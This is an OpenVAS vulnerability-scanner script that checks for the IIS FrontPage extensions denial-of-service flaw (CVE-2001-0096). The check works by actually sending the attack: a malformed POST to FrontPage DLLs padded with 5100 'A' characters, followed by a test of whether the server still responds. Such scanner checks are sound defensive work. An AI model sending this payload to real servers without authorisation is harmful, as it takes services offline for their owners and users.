# OpenVAS Vulnerability Test
# $Id: IIS_frontpage_DOS_2.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: IIS FrontPage DoS
#
# Authors:
# John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2000 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "Microsoft IIS, running Frontpage extensions, is 
vulnerable to a remote DoS attack usually called the 'malformed
web submission' vulnerability.  An attacker, exploiting this vulnerability,
will be able to render the service unusable.  If this machine serves a
business-critical functionality, there could be an impact to the business.";

tag_solution = "See http://www.microsoft.com/technet/security/bulletin/MS00-100.mspx";

if(description)
{
 script_id(10585);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2144);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2001-0096");
 name = "IIS FrontPage DoS";
 script_name(name);
 

 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2000 John Lampe");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("secpod_ms_iis_detect.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_require_keys("IIS/installed");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

#
# The script code starts here
#

port = get_http_port(default:80);

if ( ! get_port_state(port) ) exit(0);

if( ! get_kb_item("IIS/" + port + "/Ver" ) ) exit( 0 );

i=0;
if(is_cgi_installed_ka(item:"/_vti_bin/shtml.dll/_vti_rpc", port:port)) {
		i=i+1;
		filename[i]="shtml.dll/_vti_rpc";
}
if(is_cgi_installed_ka(item:"/_vti_bin/_vti_aut/author.dll", port:port)) {
		i=i+1;
		filename[i]="_vti_aut/author.dll";
}
if(i==0)exit(0);
for (j=1; j <= i; j = j+1) {
if(get_port_state(port)) {
	mysoc = http_open_socket(port);
	if(mysoc) {
		   mystring = string ("POST /_vti_bin/",
		                       filename[j] , 
				       " HTTP/1.1\r\n" ,
		                       "Date: Thur, 25 Dec 2000 12:31:00 GMT\r\n" ,
				       "MIME-Version: 1.0\r\n" , 
				       "User-Agent: MSFrontPage/4.0\r\n" ,
				       "Host: %25OPENVAS%25\r\n" ,
				       "Accept: auth/sicily\r\n",
				       "Content-Length: 5058\r\n",
				       "Content-Type: application/x-www-form-urlencoded\r\n",
				       "X-Vermeer-Content-Type: application/x-www-form-urlencoded\r\n",
				       "Connection: Keep-Alive\r\n\r\n");
		   send(socket:mysoc, data:mystring);
		   incoming = http_recv(socket:mysoc);
		   find_ms = egrep(pattern:"^Server.*IIS.*", string:incoming);
		   if(find_ms) {
				   mystring2 = string("\r\n\r\n" , "method=open+", crap (length:5100 , data:"A"), "\r\n\r\n" );
				   send(socket:mysoc, data:mystring2);
				   close(mysoc);
			} else {
				   close(mysoc);
				   exit(0);
			}
		   mysoc = http_open_socket(port);
		   mystring = http_get(item:"/", port:port);
		   send(socket:mysoc, data:mystring);
		   http_close_socket(mysoc);
		   mysoc = http_open_socket(port);
		   send(socket:mysoc, data:mystring);
		   incoming = recv_line(socket:mysoc, length:1024);
		   http_close_socket(mysoc);
		   find_200 = egrep(pattern:".*200 *OK*", string:incoming);
		   if (!find_200) {
                           security_message(port);
                           exit(0);
		   }  
     }
  }
}

